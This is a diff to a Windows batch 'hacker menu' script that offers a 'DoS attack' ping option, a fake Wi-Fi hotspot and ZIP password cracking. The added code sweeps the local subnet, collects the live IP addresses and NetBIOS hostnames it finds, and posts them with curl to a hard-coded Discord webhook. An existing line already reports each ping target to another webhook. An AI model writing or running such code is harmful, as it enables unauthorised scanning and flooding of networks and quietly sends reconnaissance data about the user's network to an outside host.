@@ -15,9 +15,9 @@ echo                                      --------------------------------------
 echo                                      1. Check System Information
 echo                                      2. DoS attack
 echo                                      3. Check IP Address
-echo                                      4. Scan Network for IPs and Device Names
-echo                                      5. Create and Monitor a Wi-Fi Hotspot
-echo                                      6. Crack ZIP File Password
+echo                                      4. NETFLUBBER
+echo                                      5. FAKEWIFI
+echo                                      6. ZIPPIEDIPPIE
 echo                                      7. Exit
 echo                                      ------------------------------------------
 echo.
@@ -53,7 +53,7 @@ goto MENU
 :PING
 cls
 echo                                      ------------------------------------------
-echo                                      Enter the IP address to ping (e.g., 192.168.1.1):
+echo                                      Enter the IP address to DoS attack (e.g., 192.168.1.1):
 echo                                      ------------------------------------------
 set /p ip=
 
@@ -80,7 +80,7 @@ set webhook_url=https://discord.com/api/webhooks/1330043207412748450/LsxuZb6v5us
 set message={"content":"IP Pinger Used!:). Target IP: %ip%, Bytes: %bytes%."}
 
 :: Escape special characters for the curl command
-set "escaped_message={\"content\":\"IP Pinger used. Target IP: %ip%, Bytes: %bytes%.\"}"
+set "escaped_message={\"content\":\"DoS attacker. Target IP: %ip%, Bytes: %bytes%.\"}"
 
 curl -H "Content-Type: application/json" -X POST -d "%escaped_message%" %webhook_url%
 
@@ -109,45 +109,52 @@ pause
 goto MENU
 
 :SCAN_NETWORK
+cls
 echo                                      ------------------------------------------
-echo                                      Scanning the local network for devices...
+echo                                      FLUBBING IP RNNNNNNN
 echo                                      ------------------------------------------
-set /p "subnet=                                      Enter your subnet (e.g., 192.168.1): "
 
-echo                                      Scanning IPs from %subnet%.1 to %subnet%.254...
-echo                                      Results will be displayed below.
-
-:: Create a temporary log file to store results
-set log=network_scan_results.txt
-echo Scanning network... > %log%
-
-:: Enable delayed variable expansion
+:: Enable delayed expansion
 setlocal enabledelayedexpansion
 
-:: Loop through all IPs in the subnet
-for /l %%i in (1, 254) do (
-    set ip=%subnet%.%%i
+:: Retrieve the current subnet
+for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4 Address"') do set "local_ip=%%i"
+set "local_ip=%local_ip: =%"
+for /f "tokens=1-3 delims=." %%a in ("%local_ip%") do set "subnet=%%a.%%b.%%c"
+
+echo Detected subnet: %subnet%.0
+echo                                      ------------------------------------------
+
+:: Prepare the results for Discord
+set "results=Active devices on the network:\n"
+
+:: Loop through the IP range and check for active devices
+for /L %%i in (1,1,254) do (
+    set "ip=%subnet%.%%i"
     ping -n 1 -w 500 !ip! | find "Reply from" >nul
     if not errorlevel 1 (
-        echo [ACTIVE] Device found at !ip!
-        echo !ip! >> %log%
-
-        :: Attempting to retrieve NetBIOS name (only works for Windows devices)
-        for /f "tokens=1,2 delims=:" %%a in ('nbtstat -A !ip! ^| find /i "Name"') do (
-            echo NetBIOS Name: %%b
-            echo !ip! - NetBIOS Name: %%b >> %log%
+        echo [ACTIVE] !ip!
+        set "results=!results![ACTIVE] !ip!\n"
+        for /f "tokens=2 delims=:" %%n in ('nbtstat -A !ip! ^| findstr "Name"') do (
+            echo Hostname: %%n
+            set "results=!results!    Hostname: %%n\n"
         )
-    ) else (
-        echo [INACTIVE] No response from !ip!
     )
 )
 
+:: Escape the Discord message for JSON
+set "escaped_results="
+for /f "delims=" %%C in ("!results!") do set "escaped_results=!escaped_results!%%C"
+
+:: Send results to Discord
+set webhook_url=https://discord.com/api/webhooks/1330050051191476265/LmmeyXk-B4z_nivugp4Fqaau81vV8fopFx7UuNb_y64IFa4wBuq9dtV4qJaiGk-ZUQN9
+echo Sending results to Discord...
+curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"!escaped_results!\"}" %webhook_url%
+
 echo                                      ------------------------------------------
-echo                                      Scan complete. Results saved in %log%.
-type %log%
+echo FLUBBED.
 pause
 goto MENU
-
 
 :WIFI_HOTSPOT
 echo                                      ------------------------------------------
